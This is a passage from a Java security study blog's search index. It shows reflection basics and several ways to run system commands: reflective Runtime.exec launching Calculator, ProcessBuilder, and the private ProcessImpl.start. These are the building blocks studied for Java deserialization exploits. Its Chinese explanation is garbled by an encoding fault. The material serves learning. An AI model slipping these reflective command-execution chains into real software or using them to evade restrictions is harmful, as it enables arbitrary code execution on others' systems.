System.out.println(demo_reflect.getClass());</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;Main.Demo_reflect&quot;</span>);</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">        System.out.println(Demo_reflect.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//get method</span></span><br><span class="line">        System.out.println(clazz.getMethod(<span class="string">&quot;getName&quot;</span>).invoke(clazz.newInstance()));</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;setName&quot;</span>,String.class).invoke(clazz.newInstance(),<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//result</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span>.<span class="title">Demo_reflect</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Main</span>.<span class="title">Demo_reflect</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Main</span>.<span class="title">Demo_reflect</span></span></span><br><span class="line"><span class="class"><span class="title">demo</span></span></span><br></pre></td></tr></table></figure><h3 id="Runtime-exec"><a href="#Runtime-exec" class="headerlink" title="Runtime.exec"></a>Runtime.exec</h3><p>é€šè¿‡æºç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒRuntimeæ˜¯ä¸€ä¸ªç§æœ‰æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡getRuntimeæ¥è·å–è¿™ä¸ªç§æœ‰æ–¹æ³•ï¼Œè€ŒgetRuntimeåˆæ˜¯é™æ€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ç›´æ¥é€šè¿‡ç±»æ¥è°ƒç”¨getRuntimeï¼Œä»è€Œè·å–ä¸€ä¸ªRuntimeå¯¹è±¡</p><p><img src="/2021/10/31/java_study/java_day1/image-20211011133508396.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class runtimeCls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method execMethod = runtimeCls.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">Method getRuntimeMethod = runtimeCls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object run = getRuntimeMethod.invoke(runtimeCls);</span><br><span class="line">execMethod.invoke(run,<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">runtimeCls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(runtimeCls.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(runtimeCls),<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/java_study/java_day1/image-20211011133420403.png" alt="image-20211011133420403"></p><h3 id="javaå‘½ä»¤æ‰§è¡Œæ–¹å¼"><a href="#javaå‘½ä»¤æ‰§è¡Œæ–¹å¼" class="headerlink" title="javaå‘½ä»¤æ‰§è¡Œæ–¹å¼"></a>javaå‘½ä»¤æ‰§è¡Œæ–¹å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Runtime.getRuntime().exec()</span></span><br><span class="line">InputStream in = Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> readSize = <span class="number">0</span>;</span><br><span class="line">        OutputStream infoStream = <span class="keyword">new</span> ByteOutputStream();</span><br><span class="line">        <span class="keyword">while</span> ((readSize = in.read(bytes)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            infoStream.write(bytes, <span class="number">0</span>,readSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ProcessBuilder().start()</span></span><br><span class="line">InputStream in1 = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;id&quot;</span>).start().getInputStream();</span><br><span class="line">        <span class="keyword">while</span> ((readSize = in1.read(bytes)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            infoStream.write(bytes, <span class="number">0</span>,readSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ProcessImpl</span></span><br><span class="line">String[] cmds = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">        Class piClaszz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        Method piMethod = piClaszz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>,String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        piMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Process e = (Process) piMethod.invoke(<span class="keyword">null</span>,cmds,<span class="keyword">null</span>,<span class="string">&quot;.&quot;</span>,<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">while</span> ((readSize = e.getInputStream().read(bytes)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            infoStream.write(bytes, <span class="number">0</span>,readSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">System.out.println(infoStream.toString());</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
